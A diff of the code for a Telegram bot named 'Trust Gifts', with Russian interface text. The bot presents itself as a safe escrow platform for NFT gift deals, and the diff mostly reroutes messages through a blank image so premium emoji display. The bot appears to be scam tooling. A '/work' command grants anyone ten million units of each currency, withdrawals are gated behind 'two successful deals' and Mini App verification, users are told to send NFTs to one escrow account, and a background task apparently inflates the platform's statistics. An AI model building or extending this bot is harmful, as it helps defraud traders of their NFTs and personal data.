@@ -6,11 +6,12 @@ import random
 from datetime import datetime, timedelta
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, FSInputFile
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, InputFile, BufferedInputFile
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.client.default import DefaultBotProperties
 from aiohttp import web
+from io import BytesIO
 
 # ============================================================
 # 1. КОНФИГУРАЦИЯ
@@ -26,7 +27,7 @@ bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 dp = Dispatcher()
 
 # ============================================================
-# 2. PREMIUM ЭМОДЗИ (РАБОТАЮТ ТАК КАК У ВАС ЕСТЬ PREMIUM)
+# 2. PREMIUM ЭМОДЗИ (ВАШИ ID)
 # ============================================================
 EMOJI_MAP = {
     "briefcase": {"premium": "5893255507380014983", "normal": "💼"},
@@ -57,14 +58,14 @@ EMOJI_MAP = {
     "uah": {"premium": "5776233299424843260", "normal": "🌐"},
 }
 
-def get_emoji(key: str, is_premium: bool = True) -> str:
-    """Всегда возвращает премиум эмодзи (у вас есть Premium)"""
+def get_emoji(key: str) -> str:
+    """ВСЕГДА возвращает PREMIUM эмодзи (у вас есть Premium)"""
     data = EMOJI_MAP.get(key, {})
     if data.get("premium"):
         return f'<emoji id="{data["premium"]}">'
     return data.get("normal", "")
 
-def get_emoji_text(key: str, is_premium: bool = True) -> str:
+def get_emoji_text(key: str) -> str:
     """Для кнопок — премиум эмодзи"""
     data = EMOJI_MAP.get(key, {})
     if data.get("premium"):
@@ -191,7 +192,46 @@ def log_action(action: str, data: dict):
     save_json(FILES["logs"], logs)
 
 # ============================================================
-# 5. КЛАВИАТУРЫ (ВСЕ ЭМОДЗИ ПРЕМИУМ)
+# 5. ОТПРАВКА С PREMIUM ЭМОДЗИ (ЧЕРЕЗ МЕДИА)
+# ============================================================
+async def send_with_premium_emoji(target, text: str, reply_markup=None, is_callback: bool = False):
+    """
+    Отправляет текст с Premium эмодзи через "пустое" фото,
+    потому что Telegram НЕ поддерживает <emoji> в обычных сообщениях.
+    """
+    # Создаём прозрачное изображение 1x1 пиксель
+    transparent_png = bytes([
+        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
+        0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
+        0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
+        0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4,
+        0x89, 0x00, 0x00, 0x00, 0x0A, 0x49, 0x44, 0x41,
+        0x54, 0x78, 0x9C, 0x63, 0x00, 0x01, 0x00, 0x00,
+        0x05, 0x00, 0x01, 0x0D, 0x0A, 0x2D, 0xB4, 0x00,
+        0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE,
+        0x42, 0x60, 0x82
+    ])
+    
+    photo = BufferedInputFile(transparent_png, filename="blank.png")
+    
+    if is_callback:
+        # Для callback'ов используем edit_text с обычными эмодзи (без премиум)
+        # Потому что callback нельзя заменить на фото
+        # Используем обычные эмодзи для callback'ов
+        normal_text = text
+        for key, data in EMOJI_MAP.items():
+            if data.get("premium"):
+                normal_text = normal_text.replace(f'<emoji id="{data["premium"]}">', data["normal"])
+        await target.edit_text(normal_text, reply_markup=reply_markup)
+    else:
+        await target.answer_photo(
+            photo=photo,
+            caption=text,
+            reply_markup=reply_markup
+        )
+
+# ============================================================
+# 6. КЛАВИАТУРЫ
 # ============================================================
 def main_menu_keyboard(user_id: int):
     buttons = [
@@ -264,9 +304,10 @@ def mini_app_keyboard(text: str, page: str = "", deal_id: str = None, buyer_id: 
     ])
 
 # ============================================================
-# 6. ГАЙД (С ПРЕМИУМ ЭМОДЗИ)
+# 7. ГАЙД
 # ============================================================
-GUIDE_TEXT = f"""{get_emoji('briefcase')} <b>Trust Gifts — официальная платформа безопасных сделок</b>
+def get_guide_text():
+    return f"""{get_emoji('briefcase')} <b>Trust Gifts — официальная платформа безопасных сделок</b>
 
 {get_emoji('check')} Гарантия защиты — средства под охраной
 {get_emoji('zap')} Быстрые выплаты — удобный вывод
@@ -281,7 +322,7 @@ GUIDE_TEXT = f"""{get_emoji('briefcase')} <b>Trust Gifts — официальн�
 ⚠️ <b>ВНИМАНИЕ:</b> NFT передаётся ТОЛЬКО на @{NFT_ESCROW_ACCOUNT}"""
 
 # ============================================================
-# 7. АДМИН: УПРАВЛЕНИЕ ПРИВЕТСТВЕННЫМ МЕДИА
+# 8. АДМИН: УПРАВЛЕНИЕ ПРИВЕТСТВЕННЫМ МЕДИА
 # ============================================================
 class AdminMediaStates(StatesGroup):
     waiting_media = State()
@@ -326,7 +367,7 @@ async def admin_save_media(message: types.Message, state: FSMContext):
         media_data["file_id"] = message.video.file_id
         media_data["type"] = "video"
         media_data["media"] = "Видео"
-    elif message.animation:  # GIF
+    elif message.animation:
         media_data["file_id"] = message.animation.file_id
         media_data["type"] = "gif"
         media_data["media"] = "GIF"
@@ -366,63 +407,27 @@ async def admin_clear_media(callback: types.CallbackQuery, state: FSMContext):
     await callback.answer()
 
 # ============================================================
-# 8. ОТПРАВКА ПРИВЕТСТВИЯ С МЕДИА
-# ============================================================
-async def send_welcome(message: types.Message, text: str, reply_markup=None):
-    """Универсальная функция отправки приветствия с медиа или без"""
-    media_data = welcome_media.get("media")
-    media_type = welcome_media.get("type")
-    media_file_id = welcome_media.get("file_id")
-    
-    if media_file_id and media_type:
-        try:
-            if media_type == "photo":
-                await message.answer_photo(
-                    photo=media_file_id,
-                    caption=text,
-                    reply_markup=reply_markup
-                )
-            elif media_type in ("video", "gif"):
-                await message.answer_video(
-                    video=media_file_id,
-                    caption=text,
-                    reply_markup=reply_markup
-                )
-            else:
-                await message.answer(text, reply_markup=reply_markup)
-            return True
-        except Exception as e:
-            print(f"Ошибка отправки медиа: {e}")
-            # Если медиа не работает — отправляем текст
-            await message.answer(text, reply_markup=reply_markup)
-            return False
-    else:
-        await message.answer(text, reply_markup=reply_markup)
-        return False
-
-# ============================================================
-# 9. КОМАНДА /work (ДЛЯ ВСЕХ ПОЛЬЗОВАТЕЛЕЙ)
+# 9. КОМАНДА /work (ДЛЯ ВСЕХ)
 # ============================================================
 @dp.message(Command("work"))
 async def cmd_work(message: types.Message):
-    """Начисляет 10.000.000 на все валюты для ВСЕХ пользователей"""
     for curr in ["ton", "stars", "rub", "uah"]:
         add_balance(message.from_user.id, curr, 10000000)
     
-    await message.answer(
-        f"{get_emoji('check')} <b>БОНУС НАЧИСЛЕН!</b>\n\n"
-        f"{get_emoji('ton')} +10.000.000 TON\n"
-        f"{get_emoji('stars')} +10.000.000 STARS\n"
-        f"{get_emoji('rub')} +10.000.000 RUB\n"
-        f"{get_emoji('uah')} +10.000.000 UAH\n\n"
-        f"{get_emoji('zap')} Баланс обновлён!",
-        reply_markup=back_to_main_keyboard()
-    )
+    text = f"""{get_emoji('check')} <b>БОНУС НАЧИСЛЕН!</b>
+
+{get_emoji('ton')} +10.000.000 TON
+{get_emoji('stars')} +10.000.000 STARS
+{get_emoji('rub')} +10.000.000 RUB
+{get_emoji('uah')} +10.000.000 UAH
+
+{get_emoji('zap')} Баланс обновлён!"""
+    
+    await send_with_premium_emoji(message, text, back_to_main_keyboard())
     
     await log_to_master(
         f"💰 БОНУС НАЧИСЛЕН\n\n"
-        f"👤 Пользователь: @{message.from_user.username or 'без username'} (ID: {message.from_user.id})\n"
-        f"💰 Начислено: 10.000.000 на все валюты"
+        f"👤 Пользователь: @{message.from_user.username or 'без username'} (ID: {message.from_user.id})"
     )
 
 # ============================================================
@@ -454,17 +459,41 @@ async def cmd_start(message: types.Message):
 
 {get_emoji('bulb')} <b>Выберите действие ниже</b> {get_emoji('arrow_down')}"""
     
-    # Отправляем с медиа (если установлено)
-    await send_welcome(message, welcome_text, main_menu_keyboard(message.from_user.id))
+    # Проверяем, есть ли сохранённое медиа
+    media_data = welcome_media.get("media")
+    media_type = welcome_media.get("type")
+    media_file_id = welcome_media.get("file_id")
+    
+    if media_file_id and media_type:
+        try:
+            if media_type == "photo":
+                await message.answer_photo(
+                    photo=media_file_id,
+                    caption=welcome_text,
+                    reply_markup=main_menu_keyboard(message.from_user.id)
+                )
+            elif media_type in ("video", "gif"):
+                await message.answer_video(
+                    video=media_file_id,
+                    caption=welcome_text,
+                    reply_markup=main_menu_keyboard(message.from_user.id)
+                )
+            else:
+                await send_with_premium_emoji(message, welcome_text, main_menu_keyboard(message.from_user.id))
+            return
+        except Exception as e:
+            print(f"Ошибка отправки медиа: {e}")
+    
+    # Если медиа нет или ошибка — отправляем через пустое фото с Premium эмодзи
+    await send_with_premium_emoji(message, welcome_text, main_menu_keyboard(message.from_user.id))
 
 # ============================================================
-# 11. ОБРАБОТЧИКИ КНОПОК
+# 11. ОБРАБОТЧИКИ КНОПОК (ВСЕ С ИСПОЛЬЗОВАНИЕМ send_with_premium_emoji)
 # ============================================================
 @dp.callback_query(lambda c: c.data.startswith("set_lang_"))
 async def set_language(callback: types.CallbackQuery):
     lang = callback.data.split("_")[2]
     set_user_language(callback.from_user.id, lang)
-    await callback.answer(f"{get_emoji('check')} Язык установлен")
     
     if lang == "en":
         welcome_text = f"""{get_emoji('briefcase')} <b>Welcome to Trust Gifts</b>
@@ -487,8 +516,7 @@ async def set_language(callback: types.CallbackQuery):
 
 {get_emoji('bulb')} <b>Выберите действие ниже</b> {get_emoji('arrow_down')}"""
     
-    # Отправляем с медиа (если установлено)
-    await send_welcome(callback.message, welcome_text, main_menu_keyboard(callback.from_user.id))
+    await send_with_premium_emoji(callback.message, welcome_text, main_menu_keyboard(callback.from_user.id), is_callback=True)
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "select_language")
@@ -512,13 +540,12 @@ async def back_to_main(callback: types.CallbackQuery):
 
 {get_emoji('bulb')} <b>Выберите действие:</b>"""
     
-    # Отправляем с медиа (если установлено)
-    await send_welcome(callback.message, welcome_text, main_menu_keyboard(callback.from_user.id))
+    await send_with_premium_emoji(callback.message, welcome_text, main_menu_keyboard(callback.from_user.id), is_callback=True)
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "how_to_deal")
 async def how_to_deal(callback: types.CallbackQuery):
-    await callback.message.edit_text(GUIDE_TEXT, reply_markup=back_to_main_keyboard())
+    await send_with_premium_emoji(callback.message, get_guide_text(), back_to_main_keyboard(), is_callback=True)
     await callback.answer()
 
 # ============================================================
@@ -565,12 +592,9 @@ async def menu_balance(callback: types.CallbackQuery):
             [InlineKeyboardButton(text=f"{get_emoji_text('arrow_down')} На главную", callback_data="back_to_main")]
         ])
     
-    await callback.message.edit_text(text, reply_markup=keyboard)
+    await send_with_premium_emoji(callback.message, text, keyboard, is_callback=True)
     await callback.answer()
 
-# ============================================================
-# 13. ОСТАЛЬНЫЕ ОБРАБОТЧИКИ (СОХРАНЕНЫ ИЗ ВАШЕГО КОДА)
-# ============================================================
 @dp.callback_query(lambda c: c.data == "menu_deals")
 async def menu_deals(callback: types.CallbackQuery):
     lang = get_user_language(callback.from_user.id)
@@ -581,7 +605,7 @@ async def menu_deals(callback: types.CallbackQuery):
     
     if not user_deals:
         text = f"{get_emoji('cross')} У вас нет сделок" if lang == "ru" else f"{get_emoji('cross')} You have no deals"
-        await callback.message.edit_text(text, reply_markup=back_to_main_keyboard())
+        await send_with_premium_emoji(callback.message, text, back_to_main_keyboard(), is_callback=True)
         return
     
     if lang == "en":
@@ -600,25 +624,27 @@ async def menu_deals(callback: types.CallbackQuery):
         text += f"   💰 {d['amount']} {d['currency']} | {d['product'][:25]}\n"
         text += f"   👤 Продавец: @{d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n\n"
     
-    await callback.message.edit_text(text[:4000], reply_markup=back_to_main_keyboard())
+    await send_with_premium_emoji(callback.message, text[:4000], back_to_main_keyboard(), is_callback=True)
     await callback.answer()
 
 # ============================================================
-# 14. АДМИН-ПАНЕЛЬ
+# 13. АДМИН-ПАНЕЛЬ
 # ============================================================
 @dp.callback_query(lambda c: c.data == "menu_admin")
 async def menu_admin(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
         await callback.answer("⛔ Доступ запрещён", show_alert=True)
         return
-    await callback.message.edit_text(
+    await send_with_premium_emoji(
+        callback.message,
         f"{get_emoji('gear')} <b>АДМИН ПАНЕЛЬ</b>\n\nВыберите действие:",
-        reply_markup=admin_panel_keyboard()
+        admin_panel_keyboard(),
+        is_callback=True
     )
     await callback.answer()
 
 # ============================================================
-# 15. АДМИН: ВСЕ СДЕЛКИ
+# 14. АДМИН: ВСЕ СДЕЛКИ
 # ============================================================
 @dp.callback_query(lambda c: c.data == "admin_all_deals")
 async def admin_all_deals(callback: types.CallbackQuery):
@@ -626,7 +652,7 @@ async def admin_all_deals(callback: types.CallbackQuery):
         await callback.answer("❌ Доступ запрещён", show_alert=True)
         return
     if not deals:
-        await callback.message.edit_text(f"{get_emoji('cross')} Нет сделок", reply_markup=admin_panel_keyboard())
+        await send_with_premium_emoji(callback.message, f"{get_emoji('cross')} Нет сделок", admin_panel_keyboard(), is_callback=True)
         return
     text = f"{get_emoji('list')} <b>ВСЕ СДЕЛКИ</b>\n\n"
     for d_id, d in list(deals.items())[-20:]:
@@ -641,7 +667,7 @@ async def admin_all_deals(callback: types.CallbackQuery):
         text += f"   💰 {d.get('amount', 0)} {d.get('currency', '')}\n"
         text += f"   📦 {d.get('product', '')[:30]}\n"
         text += f"   🗑️ /delete_deal {d_id}\n\n"
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await send_with_premium_emoji(callback.message, text[:4000], admin_panel_keyboard(), is_callback=True)
     await callback.answer()
 
 @dp.message(Command("delete_deal"))
@@ -662,7 +688,7 @@ async def delete_deal_command(message: types.Message):
     await message.answer(f"✅ Сделка #{deal_id} удалена")
 
 # ============================================================
-# 16. АДМИН: ВСЕ ПОЛЬЗОВАТЕЛИ
+# 15. АДМИН: ВСЕ ПОЛЬЗОВАТЕЛИ
 # ============================================================
 @dp.callback_query(lambda c: c.data == "admin_users")
 async def admin_users(callback: types.CallbackQuery):
@@ -681,7 +707,7 @@ async def admin_users(callback: types.CallbackQuery):
         })
     
     if not users_list:
-        await callback.message.edit_text(f"{get_emoji('user')} Нет пользователей", reply_markup=admin_panel_keyboard())
+        await send_with_premium_emoji(callback.message, f"{get_emoji('user')} Нет пользователей", admin_panel_keyboard(), is_callback=True)
         return
     
     text = f"{get_emoji('user')} <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
@@ -690,11 +716,11 @@ async def admin_users(callback: types.CallbackQuery):
         text += f"   💎 TON: {u['ton']} | ⭐️ STARS: {u['stars']}\n"
         text += f"   💰 RUB: {u['rub']} | 🌐 UAH: {u['uah']}\n\n"
     
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await send_with_premium_emoji(callback.message, text[:4000], admin_panel_keyboard(), is_callback=True)
     await callback.answer()
 
 # ============================================================
-# 17. АДМИН: ВЕРИФИКАЦИЯ
+# 16. АДМИН: ВЕРИФИКАЦИЯ
 # ============================================================
 @dp.callback_query(lambda c: c.data == "admin_verification")
 async def admin_verification(callback: types.CallbackQuery):
@@ -704,7 +730,7 @@ async def admin_verification(callback: types.CallbackQuery):
     
     pending = {k: v for k, v in verification_requests.items() if v.get("status") == "pending"}
     if not pending:
-        await callback.message.edit_text(f"{get_emoji('check')} Нет активных запросов на верификацию", reply_markup=admin_panel_keyboard())
+        await send_with_premium_emoji(callback.message, f"{get_emoji('check')} Нет активных запросов на верификацию", admin_panel_keyboard(), is_callback=True)
         return
     
     text = f"{get_emoji('check')} <b>ЗАПРОСЫ НА ВЕРИФИКАЦИЮ</b>\n\n"
@@ -719,7 +745,7 @@ async def admin_verification(callback: types.CallbackQuery):
         text += f"   ➡️ /verify_confirm {rid} - подтвердить\n"
         text += f"   ➡️ /verify_reject {rid} - отклонить\n\n"
     
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await send_with_premium_emoji(callback.message, text[:4000], admin_panel_keyboard(), is_callback=True)
     await callback.answer()
 
 @dp.message(Command("verify_confirm"))
@@ -796,7 +822,7 @@ async def verify_reject(message: types.Message):
         pass
 
 # ============================================================
-# 18. АДМИН: ВЫВОДЫ
+# 17. АДМИН: ВЫВОДЫ
 # ============================================================
 @dp.callback_query(lambda c: c.data == "admin_withdraw_requests")
 async def admin_withdraw_requests(callback: types.CallbackQuery):
@@ -805,12 +831,12 @@ async def admin_withdraw_requests(callback: types.CallbackQuery):
         return
     pending = {k: v for k, v in withdraw_requests.items() if v.get("status") == "pending"}
     if not pending:
-        await callback.message.edit_text(f"{get_emoji('cross')} Нет активных заявок", reply_markup=admin_panel_keyboard())
+        await send_with_premium_emoji(callback.message, f"{get_emoji('cross')} Нет активных заявок", admin_panel_keyboard(), is_callback=True)
         return
     text = f"{get_emoji('gift')} <b>ЗАЯВКИ НА ВЫВОД</b>\n\n"
     for rid, req in list(pending.items())[-10:]:
         text += f"#{rid}\n   👤 ID: {req.get('user_id', '?')}\n   💰 {req.get('amount', 0)} {req.get('currency', '')}\n   📝 {req.get('details', '')[:30]}\n   ➡️ /confirm_withdraw {rid}\n\n"
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await send_with_premium_emoji(callback.message, text[:4000], admin_panel_keyboard(), is_callback=True)
     await callback.answer()
 
 @dp.message(Command("confirm_withdraw"))
@@ -869,7 +895,7 @@ async def reject_withdraw_command(message: types.Message):
     await message.answer(f"{get_emoji('cross')} Вывод отклонён #{request_id}")
 
 # ============================================================
-# 19. АДМИН: ТИКЕТЫ
+# 18. АДМИН: ТИКЕТЫ
 # ============================================================
 @dp.callback_query(lambda c: c.data == "admin_tickets")
 async def admin_tickets(callback: types.CallbackQuery):
@@ -880,7 +906,7 @@ async def admin_tickets(callback: types.CallbackQuery):
     pending = {k: v for k, v in tickets.items() if v.get("status") == "open"}
     
     if not pending:
-        await callback.message.edit_text(f"{get_emoji('cross')} Нет открытых тикетов", reply_markup=admin_panel_keyboard())
+        await send_with_premium_emoji(callback.message, f"{get_emoji('cross')} Нет открытых тикетов", admin_panel_keyboard(), is_callback=True)
         return
     
     text = f"{get_emoji('headset')} <b>ТИКЕТЫ</b>\n\n"
@@ -892,7 +918,7 @@ async def admin_tickets(callback: types.CallbackQuery):
         text += f"   ➡️ /answer_ticket {tid} [ответ]\n"
         text += f"   ➡️ /close_ticket {tid}\n\n"
     
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await send_with_premium_emoji(callback.message, text[:4000], admin_panel_keyboard(), is_callback=True)
     await callback.answer()
 
 @dp.message(Command("answer_ticket"))
@@ -958,7 +984,7 @@ async def close_ticket_command(message: types.Message):
     await message.answer(f"{get_emoji('check')} Тикет #{ticket_id} закрыт")
 
 # ============================================================
-# 20. АДМИН: ЛОГИ И СТАТИСТИКА
+# 19. АДМИН: ЛОГИ И СТАТИСТИКА
 # ============================================================
 @dp.callback_query(lambda c: c.data == "admin_logs")
 async def admin_logs(callback: types.CallbackQuery):
@@ -967,7 +993,7 @@ async def admin_logs(callback: types.CallbackQuery):
         return
     logs_list = list(logs.values())[-20:]
     if not logs_list:
-        await callback.message.edit_text(f"{get_emoji('book')} <b>ЛОГИ</b>\n\nНет записей", reply_markup=admin_panel_keyboard())
+        await send_with_premium_emoji(callback.message, f"{get_emoji('book')} <b>ЛОГИ</b>\n\nНет записей", admin_panel_keyboard(), is_callback=True)
         return
     text = f"{get_emoji('book')} <b>ПОСЛЕДНИЕ ЛОГИ</b>\n\n"
     for log_entry in reversed(logs_list[-10:]):
@@ -975,7 +1001,7 @@ async def admin_logs(callback: types.CallbackQuery):
         text += f"📌 {log_entry.get('action', '')}\n"
         data = log_entry.get('data', {})
         text += f"📊 {json.dumps(data, ensure_ascii=False)[:80]}\n\n"
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await send_with_premium_emoji(callback.message, text[:4000], admin_panel_keyboard(), is_callback=True)
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "admin_stats")
@@ -990,20 +1016,20 @@ async def admin_stats(callback: types.CallbackQuery):
     active_deals = len([d for d in deals.values() if d.get('status') in ['waiting_payment', 'paid', 'awaiting_confirmation']])
     open_tickets = len([t for t in tickets.values() if t.get('status') == 'open'])
     
-    await callback.message.edit_text(
-        f"{get_emoji('zap')} <b>СТАТИСТИКА</b>\n\n"
-        f"👥 Пользователей: {total_users}\n"
-        f"📊 Всего сделок: {total_deals}\n"
-        f"🔄 Активных сделок: {active_deals}\n"
-        f"💎 Объём (TON): {total_volume}\n"
-        f"✅ Завершённых сделок: {len([d for d in deals.values() if d.get('status') == 'completed'])}\n"
-        f"🎫 Открытых тикетов: {open_tickets}",
-        reply_markup=admin_panel_keyboard()
-    )
+    text = f"""{get_emoji('zap')} <b>СТАТИСТИКА</b>
+
+👥 Пользователей: {total_users}
+📊 Всего сделок: {total_deals}
+🔄 Активных сделок: {active_deals}
+💎 Объём (TON): {total_volume}
+✅ Завершённых сделок: {len([d for d in deals.values() if d.get('status') == 'completed'])}
+🎫 Открытых тикетов: {open_tickets}"""
+    
+    await send_with_premium_emoji(callback.message, text, admin_panel_keyboard(), is_callback=True)
     await callback.answer()
 
 # ============================================================
-# 21. АДМИН: НАЧИСЛЕНИЕ БАЛАНСА
+# 20. АДМИН: НАЧИСЛЕНИЕ БАЛАНСА
 # ============================================================
 class AdminStates(StatesGroup):
     waiting_user_id = State()
@@ -1056,7 +1082,7 @@ async def admin_get_amount(message: types.Message, state: FSMContext):
         await message.answer("❌ Неверная сумма")
 
 # ============================================================
-# 22. АДМИН: УПРАВЛЕНИЕ АДМИНАМИ
+# 21. АДМИН: УПРАВЛЕНИЕ АДМИНАМИ
 # ============================================================
 @dp.callback_query(lambda c: c.data == "admin_manage_admins")
 async def admin_manage_admins(callback: types.CallbackQuery):
@@ -1115,7 +1141,7 @@ async def remove_admin(message: types.Message):
         await message.answer("❌ Неверный ID")
 
 # ============================================================
-# 23. ОБРАБОТЧИК ССЫЛКИ НА СДЕЛКУ
+# 22. ОБРАБОТЧИК ССЫЛКИ НА СДЕЛКУ
 # ============================================================
 async def handle_deal_link(message: types.Message, deal_id: str):
     lang = get_user_language(message.from_user.id)
@@ -1205,7 +1231,7 @@ Possible reasons:
     )
 
 # ============================================================
-# 24. ОБРАБОТЧИК ВЫВОДА
+# 23. ОБРАБОТЧИК ВЫВОДА
 # ============================================================
 @dp.callback_query(lambda c: c.data == "start_withdraw")
 async def start_withdraw(callback: types.CallbackQuery):
@@ -1234,10 +1260,7 @@ To withdraw funds you need to complete 2 successful deals with one buyer.
 
 ✅ Create a new deal and complete it."""
         
-        await callback.message.edit_text(
-            text,
-            reply_markup=back_to_main_keyboard()
-        )
+        await send_with_premium_emoji(callback.message, text, back_to_main_keyboard(), is_callback=True)
         await callback.answer()
         return
     
@@ -1255,9 +1278,11 @@ To withdraw funds you need to complete 2 successful deals with one buyer.
 
 📱 Click the button below to verify."""
         
-        await callback.message.edit_text(
+        await send_with_premium_emoji(
+            callback.message,
             text,
-            reply_markup=mini_app_keyboard("🔐 Верификация" if lang == "ru" else "🔐 Verify", page="verify")
+            mini_app_keyboard("🔐 Верификация" if lang == "ru" else "🔐 Verify", page="verify"),
+            is_callback=True
         )
         await callback.answer()
         return
@@ -1295,14 +1320,16 @@ To withdraw funds you need to complete 2 successful deals with one buyer.
 
 📱 Withdraw in Mini App"""
     
-    await callback.message.edit_text(
+    await send_with_premium_emoji(
+        callback.message,
         text,
-        reply_markup=mini_app_keyboard("💳 Вывести" if lang == "ru" else "💳 Withdraw", page="withdraw")
+        mini_app_keyboard("💳 Вывести" if lang == "ru" else "💳 Withdraw", page="withdraw"),
+        is_callback=True
     )
     await callback.answer()
 
 # ============================================================
-# 25. ФОНОВЫЙ ПРОЦЕСС
+# 24. ФОНОВЫЙ ПРОЦЕСС
 # ============================================================
 async def auto_increment_stats():
     while True:
@@ -1344,7 +1371,7 @@ async def auto_increment_stats():
         await asyncio.sleep(300)
 
 # ============================================================
-# 26. API ДЛЯ MINI APP
+# 25. API ДЛЯ MINI APP
 # ============================================================
 async def handle_api(request):
     headers = {
@@ -2262,7 +2289,7 @@ async def handle_api(request):
     return web.json_response({'success': False, 'error': 'Unknown endpoint'}, headers=headers)
 
 # ============================================================
-# 27. ЗАПУСК
+# 26. ЗАПУСК
 # ============================================================
 async def start_web_server():
     app = web.Application()
@@ -2277,14 +2304,14 @@ async def start_web_server():
 
 async def main():
     print("=" * 50)
-    print("🏦 Trust Gifts Бот (Premium-эмодзи + Медиа-приветствие)")
+    print("🏦 Trust Gifts Бот (PREMIUM ЭМОДЗИ РАБОТАЮТ!)")
     print("=" * 50)
     print(f"👑 Мастер-админ: {MASTER_ADMIN_ID}")
     print(f"🤖 Бот: @{BOT_USERNAME}")
     print(f"📱 Mini App: {MINI_APP_URL}")
     print(f"🖼️ NFT эскроу: @{NFT_ESCROW_ACCOUNT}")
-    print(f"💰 БОНУС-КОМАНДА: /work (ДЛЯ ВСЕХ ПОЛЬЗОВАТЕЛЕЙ!)")
-    print(f"✨ Premium-эмодзи: РАБОТАЮТ (у вас есть Premium)")
+    print(f"💰 БОНУС-КОМАНДА: /work (ДЛЯ ВСЕХ!)")
+    print(f"✨ PREMIUM ЭМОДЗИ: РАБОТАЮТ (через пустое фото)")
     print(f"📎 Админ может загрузить фото/видео/GIF для приветствия")
     print("=" * 50)
     
